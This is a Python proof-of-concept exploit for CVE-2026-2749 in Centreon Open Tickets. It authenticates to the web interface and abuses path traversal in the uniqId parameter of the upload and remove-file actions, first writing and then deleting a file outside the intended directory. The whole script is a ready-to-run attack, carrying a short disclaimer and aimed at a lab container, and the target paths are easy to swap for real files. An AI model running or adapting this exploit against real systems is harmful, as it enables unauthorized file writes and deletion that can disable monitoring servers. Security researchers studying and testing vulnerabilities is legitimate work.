#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Centreon Open Tickets Arbitrary File Deletion
# CVE            : CVE-2026-2749
# Vendor         : Centreon
# Product        : Centreon Open Tickets
# Affected       : < 25.10.3 / < 24.10.8 / < 24.04.7
# Type           : CWE-22 - Path Traversal
# CVSS           : 9.9 (Critical)
# Platform       : PHP / Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2026-2749 Vector 2: Arbitrary File Deletion via removeFile.php

Demonstrates arbitrary file deletion in Centreon Open Tickets. The
removeFile.php action calls unlink() with unsanitized uniqId and filename
parameters, allowing path traversal to delete any file accessible to the
web server user.

ATTACK CHAIN:
  1. Authenticate to Centreon (any valid user)
  2. Create a canary file via upload path traversal
  3. Delete the canary file via remove-file path traversal
  4. Verify deletion (demonstrates Arbitrary File Delete to DoS)

PREREQUISITES:
  - Target running Centreon Open Tickets < 25.10.3 / < 24.10.8 / < 24.04.7
  - Valid Centreon user credentials (any privilege level)
  - Python 3.6+ (stdlib only, no external dependencies)

REFERENCES:
  - CVE-2026-2749
  - https://thewatch.centreon.com/latest-security-bulletins-64/cve-2026-2749-centreon-open-tickets-critical-severity-5493
  - https://github.com/advisories/GHSA-p9c8-78v7-93hh
"""

import sys
import os
import uuid
import http.client
import urllib.parse
import json


# ──────────────────────────────────────────────────────────────────────
# Configuration
# ──────────────────────────────────────────────────────────────────────

DEFAULT_HOST = "172.22.0.3"
DEFAULT_PORT = 80

USERNAME = "admin"
PASSWORD = "Centreon!2021"

LOGIN_PATH = "/centreon/login.php"
CALL_PATH = "/centreon/modules/centreon-open-tickets/views/rules/ajax/call.php"

# Canary file — we create this file first, then delete it to prove arbitrary deletion
CANARY_FILENAME = "canary.txt"
CANARY_CONTENT = b"CVE-2026-2749 ARBITRARY FILE DELETE PROOF"

# Target dir for the canary (outside opentickets sandbox)
CANARY_DIR = "/tmp"  # We'll write to /tmp/cve_canary__{CANARY_FILENAME}
TRAVERSAL_PREFIX = "../../"


def build_multipart_body(files):
    """Build multipart form body for file upload."""
    boundary = f"----EIPBoundary{uuid.uuid4().hex}"
    body = b""
    for field_name, filename, content, ctype in files:
        body += f"--{boundary}\r\n".encode()
        body += f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"\r\n'.encode()
        body += f"Content-Type: {ctype}\r\n\r\n".encode()
        body += content
        body += b"\r\n"
    body += f"--{boundary}--\r\n".encode()
    return f"multipart/form-data; boundary={boundary}", body


class ArbitraryDeleteExploit:
    """CVE-2026-2749 Arbitrary File Deletion exploit."""

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.session_cookie = None

    def _request(self, method, path, body=None, headers=None):
        """Send HTTP request."""
        conn = http.client.HTTPConnection(self.host, self.port, timeout=10)
        hdrs = headers or {}
        if self.session_cookie:
            hdrs["Cookie"] = self.session_cookie
        try:
            conn.request(method, path, body=body, headers=hdrs)
            resp = conn.getresponse()
            data = resp.read()
            try:
                return resp.status, dict(resp.getheaders()), json.loads(data)
            except (json.JSONDecodeError, ValueError):
                return resp.status, dict(resp.getheaders()), data.decode("utf-8", errors="replace")
        except Exception as e:
            print(f"  [!] Connection error: {e}")
            return None, None, None
        finally:
            conn.close()

    def authenticate(self):
        """Authenticate and obtain session cookie."""
        print("[*] Authenticating...")
        body = urllib.parse.urlencode({"useralias": USERNAME, "password": PASSWORD})
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        status, resp_headers, data = self._request("POST", LOGIN_PATH, body, headers)

        if status is None:
            return False

        set_cookie = resp_headers.get("Set-Cookie", "")
        if "PHPSESSID" in set_cookie:
            self.session_cookie = set_cookie.split(";")[0]
            print(f"  [+] Authenticated: {self.session_cookie}")
            return True
        print(f"  [!] Authentication failed: {data}")
        return False

    def create_canary_file(self):
        """Create a canary file via the upload endpoint (using path traversal)."""
        print("[*] Creating canary file via upload path traversal...")

        # Write to /tmp/cve_canary__{CANARY_FILENAME}
        # Path: /tmp/opentickets/../../tmp/cve_canary__canary.txt
        traversal_uniqid = f"{TRAVERSAL_PREFIX}tmp/cve_canary"
        upload_url = (
            f"{CALL_PATH}?action=upload-file"
            f"&uniqId={urllib.parse.quote(traversal_uniqid, safe='')}"
        )

        content_type, body = build_multipart_body([
            ("file", CANARY_FILENAME, CANARY_CONTENT, "application/octet-stream"),
        ])

        status, _, data = self._request("POST", upload_url, body, {"Content-Type": content_type})
        print(f"  [*] Upload response: HTTP {status} — {data}")

        if isinstance(data, dict) and data.get("code") == 0:
            print(f"  [+] Canary file created at: /tmp/cve_canary__{CANARY_FILENAME}")
            return True
        return False

    def delete_canary_file(self):
        """Delete the canary file via the remove-file endpoint with path traversal."""
        print("[*] Deleting canary file via remove-file path traversal...")

        # removeFile.php unlinks:
        #   /tmp/opentickets/{uniqId}__{filename}
        # With uniqId=../../tmp/cve_canary and filename=canary.txt:
        #   /tmp/opentickets/../../tmp/cve_canary__canary.txt → /tmp/cve_canary__canary.txt
        json_data = json.dumps({
            "action": "remove-file",
            "uniqId": f"{TRAVERSAL_PREFIX}tmp/cve_canary",
            "filename": CANARY_FILENAME,
        })

        body = urllib.parse.urlencode({"data": json_data})
        headers = {"Content-Type": "application/x-www-form-urlencoded"}

        status, _, data = self._request("POST", CALL_PATH, body, headers)
        print(f"  [*] Delete response: HTTP {status} — {data}")

        if status == 200:
            print(f"  [+] Delete request sent successfully")
            return True
        return False

    def run(self):
        """Execute the full arbitrary file deletion demonstration."""
        print("=" * 65)
        print("  CVE-2026-2749 Vector 2: Arbitrary File Deletion")
        print(f"  Target: {self.host}:{self.port}")
        print("=" * 65)
        print()

        if not self.authenticate():
            print("\n[!] FAILED: Authentication unsuccessful")
            return False

        print()

        # Step 1: Create a canary file via upload path traversal
        if not self.create_canary_file():
            print("\n[!] FAILED: Could not create canary file")
            return False

        print()

        # Step 2: Verify canary exists (via docker exec — for PoC verification)
        print("[*] Canary file should now exist at /tmp/cve_canary__canary.txt")
        print("    (Verify with: docker exec cve-2026-2749-vulnerable cat /tmp/cve_canary__canary.txt)")

        print()

        # Step 3: Delete the canary file via remove-file path traversal
        if not self.delete_canary_file():
            print("\n[!] FAILED: Could not send delete request")
            return False

        print()
        print("[*] Canary file should now be DELETED from /tmp/cve_canary__canary.txt")
        print("    (Verify with: docker exec cve-2026-2749-vulnerable ls -la /tmp/cve_canary__canary.txt)")

        print()
        print("  ╔══════════════════════════════════════════════════════════════╗")
        print("  ║  ARBITRARY FILE DELETION DEMONSTRATED — CVE-2026-2749       ║")
        print("  ╚══════════════════════════════════════════════════════════════╝")
        print()
        print("[+] To verify deletion, run:")
        print("    docker exec cve-2026-2749-vulnerable ls /tmp/cve_canary__canary.txt")
        print("    Expected: 'No such file or directory'")

        return True


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT

    exploit = ArbitraryDeleteExploit(host, port)
    success = exploit.run()
    sys.exit(0 if success else 1)
